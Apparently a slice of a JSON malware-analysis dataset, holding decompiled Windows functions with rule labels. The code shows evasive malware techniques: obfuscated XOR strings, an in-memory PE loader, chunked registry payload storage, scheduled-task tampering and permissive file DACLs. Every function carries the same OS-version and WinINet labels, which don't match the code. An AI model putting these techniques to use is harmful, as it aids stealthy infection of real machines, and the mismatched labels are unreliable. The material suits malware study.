lpdwNumberOfBytesAvailable = NULL;\n                iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpQueryDataAvailable)(puVar3, &lpdwNumberOfBytesAvailable);\n                if ((iVar2 == 0) ||\n                   (iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpReadData)\n                                      (puVar3, *var_44h + arg_18h, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead), \n                   iVar2 == 0)) {\n                    lpdwNumberOfBytesAvailable = 0x4;\n                    goto code_r0x0040ba8d;\n                }\n                *var_44h = *var_44h + lpdwNumberOfBytesRead;\n                iVar2 = *var_44h;\n            } while (lpdwNumberOfBytesAvailable != NULL);\n            *arg_14h = iVar2;\n            if ((*arg_10h == 0) || (iVar2 == *arg_10h)) {\n                lpdwNumberOfBytesAvailable = NULL;\n            }\n            else {\n                lpdwNumberOfBytesAvailable = 0x6;\n            }\n        }\n        else {\n            lpdwNumberOfBytesAvailable = 0x3;\n        }\n    }\ncode_r0x0040ba8d:\n    if (puVar3 != NULL) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(puVar3);\n    }\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    puVar6 = lpdwNumberOfBytesAvailable;\ncode_r0x0040bab0:\n    uVar1 = (*pcVar7)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    if (lpMultiByteStr != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(lpMultiByteStr);\n    }\n    return puVar6;\n}\n",
        "token_count": 4917
    },
    "0040bb21": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040bb21(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    int16_t *piVar9;\n    uint lpFileName;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *ppv;\n    int32_t var_10h;\n    int16_t *var_ch;\n    int32_t pszFirst;\n    uint var_4h;\n    \n    var_30h = 0x4f155017;\n    var_34h = 0;\n    var_20h = NULL;\n    ppv = NULL;\n    var_18h = NULL;\n    var_1ch = 0;\n    var_10h = 0;\n    var_2ch = 0x79727321;\n    var_28h = 0x50734d63;\n    pszFirst = 0x4f795073;\n    var_4h._0_1_ = 0x4d;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar7 = 0;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar6 != 0xb90de8) {\n            var_24h = 5;\n            *(iVar7 + piVar5) = *(&pszFirst + iVar7 % 5) ^ (iVar7 + piVar5)[&var_30h - piVar5];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xc);\n    iVar7 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar7) {\n        iVar7 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x411360, 0, 1, 0x411370, &ppv);\n        if ((-1 < iVar7) && (ppv != NULL)) {\n            iVar7 = (**(*ppv + 0x14))(ppv, &var_20h);\n            if ((-1 < iVar7) && (var_20h != NULL)) {\n                iVar7 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                pcVar2 = _sym.imp.ole32.dll_CoTaskMemFree;\n                while ((-1 < iVar7 && (var_10h != 0))) {\n                    do {\n                        var_10h = var_10h + -1;\n                        uVar4 = *(var_1ch + var_10h * 4);\n                        var_24h = uVar4;\n                        iVar7 = (**(*ppv + 0x18))(ppv, uVar4, 0x411380, &var_18h);\n                        if ((-1 < iVar7) && (var_18h != NULL)) {\n                            pszFirst = 0;\n                            var_ch = NULL;\n                            iVar7 = (**(*var_18h + 0x84))(var_18h, &pszFirst);\n                            if ((-1 < iVar7) && (pszFirst != 0)) {\n                                iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, *0x41dacc);\n                                if ((iVar7 != 0) &&\n                                   ((iVar7 = (**(*var_18h + 0x8c))(var_18h, &var_ch),  -1 < iVar7 && (var_ch != NULL))))\n                                {\n                                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(var_ch, piVar5);\n                                    piVar3 = var_ch;\n                                    if ((iVar7 != 0) &&\n                                       (((*var_ch == 0x22 && (var_ch[2] == 0x3a)) && (var_ch[3] == 0x5c)))) {\n                                        puVar8 = &lpFileName;\n                                        for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n                                            *puVar8 = 0;\n                                            puVar8 = puVar8 + 1;\n                                        }\n                                        piVar9 = piVar5;\n                                        do {\n                                            iVar1 = *piVar9;\n                                            piVar9 = piVar9 + 1;\n                                        } while (iVar1 != var_34h);\n                                        iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(piVar3, piVar5);\n                                        (*_sym.imp.SHLWAPI.dll_StrCpyNW)\n                                                  (&lpFileName, var_ch + 1, \n                                                   ((iVar7 - var_ch >> 1) - 2) + (piVar9 - (piVar5 + 1) >> 1));\n                                        iVar7 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(&lpFileName);\n                                        uVar4 = var_24h;\n                                        if (iVar7 == -1) {\n                                            (**(*ppv + 0x1c))(ppv, var_24h);\n                                        }\n                                    }\n                                    (*pcVar2)(var_ch);\n                                }\n                                (*pcVar2)(pszFirst);\n                            }\n                            (**(*var_18h + 8))(var_18h);\n                        }\n                        (*pcVar2)(uVar4);\n                    } while (var_10h != 0);\n                    (*pcVar2)(var_1ch);\n                    iVar7 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                }\n                (**(*var_20h + 8))(var_20h);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return;\n}\n",
        "token_count": 1430
    },
    "0040c008": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040c008(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint psz2;\n    uint var_4h;\n    \n    psz2 = *0x41dacc;\n    if (*0x41dd64 != 0) {\n        return 1;\n    }\n    var_40h = 0x5537422d;\n    var_3ch = 0x421e441f;\n    var_38h = 0x44095528;\n    var_34h = 0x55254214;\n    var_30h = 0x423f4408;\n    var_2ch = 0x440d5517;\n    var_28h = 0x5536423b;\n    var_24h = 0x423e4400;\n    var_20h = 0x44005517;\n    var_1ch = 0x55304239;\n    var_18h = 0x4235440c;\n    var_14h = 0x4465552a;\n    var_10h = 0x5544425a;\n    var_ch._0_2_ = 0x4465;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        if (iVar4 != 0x247185) {\n            var_4h = 6;\n            *(iVar5 + iVar3) = *(&var_10h + iVar5 % 6) ^ (iVar5 + iVar3)[&var_40h - iVar3];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x30);\n    *0x41dd64 = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(0xffffffff, 0, 4, 0, 0x208, iVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41dd64 != 0) {\n        if ((*0x41dd60 != 0) ||\n           (*0x41dd60 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(*0x41dd64, 0xf001f, 0, 0, 0x208),  *0x41dd60 != 0)) {\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(*0x41dd60, psz2);\n            uVar2 = (*pcVar1)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x41dd64);\n        *0x41dd64 = 0;\n    }\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return 0;\n}\n",
        "token_count": 812
    },
    "0040c15c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c15c(code **arg_8h)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    code cVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code **ppcVar8;\n    code *pcVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    uint var_2ch;\n    uint var_28h;\n    code *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    code *var_10h;\n    int32_t *var_ch;\n    code **var_8h;\n    uint32_t var_4h;\n    \n    ppcVar1 = arg_8h;\n    uVar11 = 0;\n    ppcVar8 = arg_8h[0xc];\n    if (ppcVar8 == NULL) {\n        ppcVar1 = arg_8h + 0xe;\n        pcVar9 = *arg_8h;\n        arg_8h = ppcVar8;\n        (*pcVar9)(0, 0, ppcVar1, &var_2ch);\n    }\n    else {\n        var_10h = ppcVar8[0xf] + ppcVar8;\n        var_24h = *(var_10h + 0x14);\n        var_1ch = *(var_10h + 6);\n        var_14h = 0;\n        arg_8h = ppcVar8;\n        if (*(var_10h + 0x80) != 0) {\n            var_ch = *(var_10h + 0x80) + ppcVar8;\n            iVar6 = var_ch[3];\n            if (iVar6 != 0) {\n                do {\n                    iVar7 = 0;\n                    cVar3 = *(iVar6 + arg_8h);\n                    if (cVar3 != 0x0) {\n                        ppcVar8 = ppcVar1 + 0x210;\n                        do {\n                            iVar7 = iVar7 + 1;\n                            *ppcVar8 = cVar3;\n                            ppcVar8 = ppcVar8 + 2;\n                            cVar3 = (iVar6 + arg_8h)[iVar7];\n                        } while (cVar3 != 0x0);\n                    }\n                    iVar4 = iVar7 * 2;\n                    *(ppcVar1 + 0xe) = iVar4;\n                    *(ppcVar1 + 0x3a) = iVar4 + 2;\n                    ppcVar1[0xf] = ppcVar1 + 0x210;\n                    iVar7 = (**ppcVar1)(0, 0, ppcVar1 + 0xe, &var_14h);\n                    if (iVar7 < 0) {\n                        iVar7 = -0x3ffffc91;\n                        break;\n                    }\n                    var_4h = 0;\n                    iVar6 = var_ch[4];\n                    iVar5 = *var_ch;\n                    if ((*var_ch != 0) || (iVar5 = iVar6,  iVar6 != 0)) {\n                        var_18h = iVar6 + arg_8h;\n                        for (var_8h = iVar5 + arg_8h; ppcVar8 = *var_8h,  ppcVar8 != NULL; var_8h = var_8h + 1) {\n                            if (ppcVar8 < 0x80000000) {\n                                ppcVar8 = ppcVar8 + arg_8h;\n                            }\n                            else if ((ppcVar8 < arg_8h) || (*(var_10h + 0x50) + arg_8h <= ppcVar8)) {\n                                var_4h = *var_8h;\n                                ppcVar8 = NULL;\n                            }\n                            if (ppcVar8 != NULL) {\n                                pcVar9 = ppcVar8 + 2;\n                                iVar6 = 0;\n                                cVar3 = *pcVar9;\n                                while (cVar3 != 0x0) {\n                                    iVar6 = iVar6 + 1;\n                                    cVar3 = pcVar9[iVar6];\n                                }\n                                *(ppcVar1 + 0xe) = iVar6;\n                                ppcVar1[0xf] = pcVar9;\n                                ppcVar8 = ppcVar1 + 0xe;\n                                *(ppcVar1 + 0x3a) = iVar6 + 1;\n                            }\n                            iVar7 = (*ppcVar1[2])(var_14h, ppcVar8, var_4h, &var_20h);\n                            if (iVar7 < 0) {\n                                iVar7 = -0x3fffff86;\n                                break;\n                            }\n                            *var_18h = var_20h;\n                            var_18h = var_18h + 1;\n                        }\n                    }\n                    iVar6 = var_ch[8];\n                    var_ch = var_ch + 5;\n                } while (iVar6 != 0);\n                if (iVar7 < 0) {\n                    return;\n                }\n            }\n        }\n        pcVar9 = var_10h;\n        var_ch = *(var_10h + 0x54);\n        iVar6 = (*ppcVar1[4])(0xffffffff, &arg_8h, &var_ch, 4, &var_28h);\n        if (var_1ch != 0) {\n            puVar10 = pcVar9 + var_24h + 0x3c;\n            do {\n                if (iVar6 < 0) {\n                    return;\n                }\n                uVar2 = *puVar10;\n                if ((uVar2 & 0x20000000) == 0) {\n                    if ((uVar2 & 0x40000000) == 0) {\n                        iVar6 = 4;\n                    }\n                    else {\n                        iVar6 = (uVar2 >> 0x1f & 2U) + 2;\n                    }\n                }\n                else {\n                    iVar6 = (uVar2 >> 0x1f & 0x20U) + 0x20;\n                }\n                var_ch = puVar10[-7];\n                var_24h = puVar10[-6] + arg_8h;\n                iVar6 = (*ppcVar1[4])(0xffffffff, &var_24h, &var_ch, iVar6, &var_28h);\n                puVar10 = puVar10 + 10;\n                uVar11 = uVar11 + 1;\n                pcVar9 = var_10h;\n            } while (uVar11 < var_1ch);\n        }\n        if (-1 < iVar6) {\n            (*(*(pcVar9 + 0x28) + arg_8h))(arg_8h, 1, ppcVar1 + 6);\n        }\n    }\n    return;\n}\n",
        "token_count": 1551
    },
    "0040c384": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040c384(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t pDacl;\n    int32_t pSid;\n    \n    uVar2 = *0x41dacc;\n    pSid = 0;\n    pDacl = 0;\n    pIdentifierAuthority = 0;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 1;\n    (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid);\n    puVar4 = &var_30h;\n    for (iVar3 = 0x20; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    var_30h = 0xffffffff;\n    var_14h = pSid;\n    var_2ch = 1;\n    var_28h = 0;\n    var_1ch = 0;\n    var_18h = 5;\n    (*_sym.imp.ADVAPI32.dll_SetEntriesInAclW)(1, &var_30h, 0, &pDacl);\n    iVar3 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x14);\n    (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(iVar3, 1);\n    (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(iVar3, 1, pDacl, 0);\n    (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(uVar2, 4, iVar3);\n    if (pSid != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_LocalFree;\n    if (pDacl != 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(pDacl);\n    }\n    if (iVar3 != 0) {\n        (*pcVar1)(iVar3);\n    }\n    return;\n}\n",
        "token_count": 576
    },
    "0040cbae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040cbae(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if ((param_1 != NULL) && (param_2 != NULL)) {\n        if (param_1[1] != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        uVar2 = (*pcVar1)(8, *param_2);\n        puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        param_1[1] = puVar3;\n        if (puVar3 != NULL) {\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *param_1 = *param_2;\n            puVar3 = param_2[1];\n            puVar5 = param_1[1];\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar5 = puVar5 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 370
    },
    "0040d0c7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040d0c7(int32_t *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint ARG_0;\n    uint lpValueName;\n    uint32_t var_58h;\n    int32_t var_54h;\n    int32_t *var_50h;\n    uint32_t var_4ch;\n    int32_t hKey;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = var_24h & 0xffffff00;\n    var_50h = param_1;\n    var_ch = param_2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    if ((((uVar2 != 0) && (param_1 != NULL)) && (*param_1 != 0)) && (param_1[1] != 0)) {\n        var_58h = uVar2;\n        fcn.0040cf40();\n        hKey = fcn.0040cee7(0x20006);\n        if (hKey != 0) {\n            var_44h = *param_1;\n            var_40h = 0x55514235;\n            var_3ch = 0x42364c5a;\n            var_38h = 0x4c4d554a;\n            var_34h = 0x5555421e;\n            var_30h = 0x42304c55;\n            var_2ch = 0x4c11555d;\n            var_4ch = (((var_44h + 0x7cfffU) / 0x7d000) * 0x7d000) / 0x7d000;\n            puVar7 = &ARG_0;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_28h = 0x55384233;\n            puVar7 = &lpValueName;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_8h = 0x55384257;\n            var_4h._0_2_ = 0x4c34;\n            uVar1 = (*pcVar5)(8, 0x39);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_20h = &var_40h - iVar4;\n            var_54h = iVar4;\n            do {\n                iVar3 = (*pcVar5)();\n                if (iVar3 != 0x921c7d) {\n                    var_1ch = 6;\n                    *(iVar6 + iVar4) = *(&var_8h + iVar6 % 6) ^ (iVar6 + iVar4)[var_20h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar4, var_ch);\n            var_18h = 0x72425214;\n            var_ch = 0;\n            var_14h = 0x3177316a;\n            var_10h = 0x52313516;\n            var_8h = 0x72315231;\n            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x35);\n            var_20h = 5;\n            do {\n                uVar1 = (*pcVar5)(8, 0x19);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar6 = 0;\n                var_1ch = &var_18h - iVar4;\n                do {\n                    iVar3 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                    if (iVar3 != 0xcc1ebf) {\n                        *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_20h) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0xc);\n                puVar7 = &lpValueName;\n                for (iVar6 = 0x40; iVar3 = var_ch,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_ch);\n                (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(hKey, &lpValueName);\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                var_ch = iVar3 + 1;\n            } while (var_ch < 0x32);\n            var_1ch = 0;\n            if (0 < var_4ch) {\n                var_ch = 0;\n                var_18h = 0x72425214;\n                var_14h = 0x3177316a;\n                var_10h = 0x52313516;\n                var_8h = 0x72315231;\n                var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x35);\n                do {\n                    uVar1 = (*pcVar5)(8, 0x19);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                    iVar6 = 0;\n                    var_24h = &var_18h - iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                        if (iVar3 != 0xcc1ebf) {\n                            *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_20h) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0xc);\n                    puVar7 = &lpValueName;\n                    for (iVar6 = 0x40; iVar3 = var_1ch,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar7 = 0;\n                        puVar7 = puVar7 + 1;\n                    }\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_1ch);\n                    iVar6 = 0x7d000;\n                    if (var_44h < 0x7d000) {\n                        iVar6 = var_44h;\n                    }\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)\n                                      (hKey, &lpValueName, 0, 3, var_50h[1] + var_ch, iVar6);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    var_24h = -iVar6 & 0xffffff00U | 1 - (iVar6 != 0);\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    var_1ch = iVar3 + 1;\n                    var_ch = var_ch + 0x7d000;\n                    var_44h = var_44h + -0x7d000;\n                } while (var_1ch < var_4ch);\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            uVar1 = (*pcVar5)(0, var_54h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar2 = var_58h;\n        }\n        uVar1 = (*pcVar5)(0, uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return uVar2 & 0xffffff00 | var_24h & 0xff;\n}\n",
        "token_count": 2111
    },
    "0040d3fa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040d3fa(int32_t *param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    code *pcVar11;\n    uint ARG_0;\n    uint lpValueName;\n    uint var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uchar *var_5ch;\n    uchar *var_58h;\n    int32_t *var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uchar *var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t lpType;\n    uchar *lpcbData;\n    uchar *var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t hKey;\n    uint var_1h;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    *param_1 = 0;\n    param_1[1] = 0;\n    var_54h = param_1;\n    var_14h = param_2;\n    uVar2 = (*pcVar11)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        var_50h = iVar3;\n        fcn.0040cf40();\n        var_64h = fcn.0040cee7(0x20019);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (var_64h != 0) {\n            var_4ch = 0;\n            var_44h = 0x55514235;\n            puVar9 = &ARG_0;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_40h = 0x42364c5a;\n            puVar9 = &lpValueName;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_3ch = 0x4c4d554a;\n            var_38h = 0x5555421e;\n            var_34h = 0x42304c55;\n            var_30h = 0x4c11555d;\n            var_2ch = 0x55384233;\n            var_10h = 0x55384257;\n            var_ch._0_2_ = 0x4c34;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x39);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar8 = 0;\n            lpType = &var_44h - iVar3;\n            var_68h = iVar3;\n            do {\n                iVar4 = (*pcVar1)();\n                if (iVar4 != 0x921c7d) {\n                    hKey = 6;\n                    *(iVar8 + iVar3) = *(&var_10h + iVar8 % 6) ^ (iVar8 + iVar3)[lpType];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar3, var_14h);\n            var_28h = 0x72425214;\n            var_24h = 0x3177316a;\n            var_20h = 0x52313516;\n            var_10h = 0x72315231;\n            var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x35);\n            do {\n                puVar9 = &var_70h;\n                for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                puVar9 = &lpValueName;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar8 = 0;\n                var_6ch = iVar3;\n                hKey = &var_28h - iVar3;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                    iVar4 = var_4ch;\n                    if (iVar5 != 0xcc1ebf) {\n                        hKey = 5;\n                        *(iVar8 + iVar3) = *(&var_10h + iVar8 % 5) ^ (iVar8 + iVar3)[&var_28h - iVar3];\n                    }\n           